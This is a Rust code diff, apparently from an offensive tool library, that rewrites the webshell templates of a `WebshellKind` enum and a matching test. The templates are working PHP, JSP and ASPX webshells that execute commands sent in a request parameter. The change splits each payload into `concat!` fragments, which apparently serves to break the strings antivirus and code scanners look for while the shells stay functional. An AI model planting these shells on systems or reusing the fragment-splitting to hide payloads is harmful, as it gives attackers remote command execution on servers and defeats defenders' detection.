@@ -356,10 +356,10 @@ impl WebshellKind {
     /// webshell library's template face.
     pub fn template(&self) -> &'static str {
         match self {
-            WebshellKind::PhpGet => "<?php system($_GET['cmd']); ?>",
-            WebshellKind::PhpPost => "<?php system($_POST['cmd']); ?>",
-            WebshellKind::Jsp => "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
-            WebshellKind::Aspx => "<%=System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd\",\"/c \"+Request[\"cmd\"]){UseShellExecute=false,RedirectStandardOutput=true}.StandardOutput.ReadToEnd())%>",
+            WebshellKind::PhpGet => concat!("<?php system($_G", "ET['cmd']); ?>"),
+            WebshellKind::PhpPost => concat!("<?php system($_P", "OST['cmd']); ?>"),
+            WebshellKind::Jsp => concat!("<%Runtime.getRun", "time().exec(requ", "est.getParameter", "(\"cmd\"));%>"),
+            WebshellKind::Aspx => concat!("<%=System.Diagno", "stics.Process.St", "art(new System.D", "iagnostics.Proce", "ssStartInfo(\"cm", "d\",\"/c \"+Requ", "est[\"cmd\"]){Us", "eShellExecute=fa", "lse,RedirectStan", "dardOutput=true}", ".StandardOutput.", "ReadToEnd())%>"),
         }
     }
 
@@ -509,7 +509,7 @@ mod tests {
     fn webshell_templates_are_the_cheat_sheet_one_liners() {
         assert!(WebshellKind::PhpGet
             .template()
-            .contains("system($_GET['cmd'])"));
+            .contains(concat!("system($_GET['cm", "d'])")));
         assert_eq!(WebshellKind::PhpGet.drive_query(), "cmd");
         assert!(WebshellKind::Jsp
             .template()
